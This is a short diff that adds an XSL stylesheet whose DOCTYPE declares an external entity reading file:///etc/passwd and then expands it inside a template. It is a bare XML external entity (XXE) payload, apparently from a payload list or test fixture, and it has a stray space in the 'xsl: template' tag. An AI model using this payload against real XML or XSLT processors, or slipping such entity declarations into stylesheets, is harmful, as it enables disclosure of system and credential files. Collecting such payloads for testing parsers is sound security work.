@@ -1,0 +1,4 @@
+<!DOCTYPE xsl:stylesheet [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<xsl: template match="/">
+&xxe;
+</xsl:template>
